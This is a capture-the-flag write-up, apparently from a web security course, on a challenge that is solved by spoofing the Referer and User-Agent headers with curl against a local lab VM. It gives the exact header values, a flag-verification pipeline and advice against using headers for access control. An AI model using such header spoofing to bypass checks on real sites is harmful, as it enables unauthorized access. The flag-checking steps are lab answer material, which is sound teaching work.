# Spoof (curl)

## 1. Discovery

The challenge page is available at:

```text
/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
```

Test the page with `curl` and inspect which request details affect the response. In this challenge, the relevant details are the `Referer` and `User-Agent` HTTP headers.

## 2. Exploitation

Send the required header values:

```bash
curl -s \
-H 'Referer: https://www.nsa.gov/' \
-H 'User-Agent: ft_bornToSec' \
"http://127.0.0.1:8080/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f" \
| grep "Good Job"
```

Observed result: the response displays the challenge flag.

## 3. Technical Explanation

The request succeeds when it includes `Referer: https://www.nsa.gov/` and `User-Agent: ft_bornToSec`. This indicates that the page checks these request headers. The observed result does not establish the exact server-side check or show that the request is authenticated.

Both headers are controlled by the client. `curl` can set them to arbitrary values. A `Referer` value can be missing or changed, and a `User-Agent` value identifies the client software only by its own claim.

## 4. Security Impact

If an application treats these headers as proof of identity or authorization, an attacker can supply the expected values and bypass that check. The headers do not prove that a request came from the named site, browser, or user.

## 5. Prevention

Do not use `Referer` or `User-Agent` as authentication evidence or as the only access control. Check access on the server with a validated session, authenticated credentials, and explicit authorization rules. Treat request headers as untrusted input.

## 6. Flag Verification

Run the command from the repository root. It sends the required headers, matches the response's `The flag is :` text, extracts that value, and compares it with `mandatory/spoof/flag`:

```bash
curl -s \
-H 'Referer: https://www.nsa.gov/' \
-H 'User-Agent: ft_bornToSec' \
"http://127.0.0.1:8080/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f" \
| grep -oE 'The flag is : [a-f0-9]{64}' \
| grep -oE '[a-f0-9]{64}' \
| diff - mandatory/spoof/flag
```

An exit status of `0` means that the retrieved flag matches the saved flag. The address `127.0.0.1:8080` is our local VirtualBox port-forwarding address. Adjust it if the evaluation environment uses a different address or port.
